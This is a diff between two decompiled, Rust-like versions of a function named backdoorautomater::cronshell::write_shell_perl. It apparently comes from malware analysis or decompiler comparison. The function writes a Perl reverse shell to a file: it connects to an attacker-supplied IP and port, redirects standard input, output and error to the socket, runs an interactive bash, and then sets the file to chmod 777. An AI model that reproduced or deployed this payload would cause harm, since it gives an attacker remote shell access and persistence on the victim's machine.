@@ -19,11 +19,11 @@ fn backdoorautomater::cronshell::write_shell_perl(a0: &struct24, a1: &struct24, 
     let v17: struct24;  // [bp-0x130]
     let v18: &str;  // [bp-0x130]
     let v19: std::fs::File;  // [bp-0x12c]
-    let v20: u64;  // [bp-0x128]
+    let v20: core::fmt::Arguments;  // [bp-0x128]
     let v21: u128;  // [bp-0x120]
     let v22: struct56;  // [bp-0x60]
     let v23: u64;  // [bp-0x40]
-    let v25: core::result::Result<core::net::ip_addr::Ipv4Addr, core::net::parser::AddrParseError>;  // r12
+    let v25: core::fmt::Arguments;  // r12
 
     v14 = std::fs::File::create(a2, a2);
     match v14 {
@@ -31,35 +31,35 @@ fn backdoorautomater::cronshell::write_shell_perl(a0: &struct24, a1: &struct24, 
         },
         Ok(v0) => {
             v25 = std::io::Write::write_all(&v0, "use Socket;\n");
-            if let Ok(_) = v25 {
+            if !v25 {
                 v18 = "$i='";
                 v21 = *((a1 + 8) as &i128);
                 v7 = alloc::str::join_generic_copy(&v14, 2, 1, 0);
                 v1 = v8;
                 alloc::vec::Vec<T,A>::extend_from_slice(&v1, "';\n");
                 v25 = std::io::Write::write_all(&v0, v2, v3);
-                if let Ok(_) = v25 {
+                if !v25 {
                     v15 = "$p=";
                     v21 = *((a0 + 8) as &i128);
                     v7 = alloc::str::join_generic_copy(&v14, 2, 1, 0);
                     v4 = v8;
                     alloc::vec::Vec<T,A>::extend_from_slice(&v4, ";\n");
                     v25 = std::io::Write::write_all(&v0, v5, v6);
-                    if let Ok(_) = v25 {
+                    if !v25 {
                         v25 = std::io::Write::write_all(&v0, "socket(S,PF_INET,SOCK_STREAM,getprotobyname('tcp'));\n");
-                        if let Ok(_) = v25 {
+                        if !v25 {
                             v25 = std::io::Write::write_all(&v0, "if(connect(S,sockaddr_in($p,inet_aton($i)))){\n");
-                            if let Ok(_) = v25 {
+                            if !v25 {
                                 v25 = std::io::Write::write_all(&v0, "open(STDIN,'>&S');\n");
-                                if let Ok(_) = v25 {
+                                if !v25 {
                                     v25 = std::io::Write::write_all(&v0, "open(STDOUT,'>&S');\n");
-                                    if let Ok(_) = v25 {
+                                    if !v25 {
                                         v25 = std::io::Write::write_all(&v0, "open(STDERR,'>&S');\n");
-                                        if let Ok(_) = v25 {
+                                        if !v25 {
                                             v25 = std::io::Write::write_all(&v0, "exec('/usr/bin/bash -i');\n");
-                                            if let Ok(_) = v25 {
+                                            if !v25 {
                                                 v25 = std::io::Write::write_all(&v0, "};\n");
-                                                if let Ok(_) = v25 {
+                                                if !v25 {
                                                     v16 = "chmod 777 ";
                                                     v21 = *((a2 + 8) as &i128);
                                                     v7 = alloc::str::join_generic_copy(&v14, 2, 1, 0);
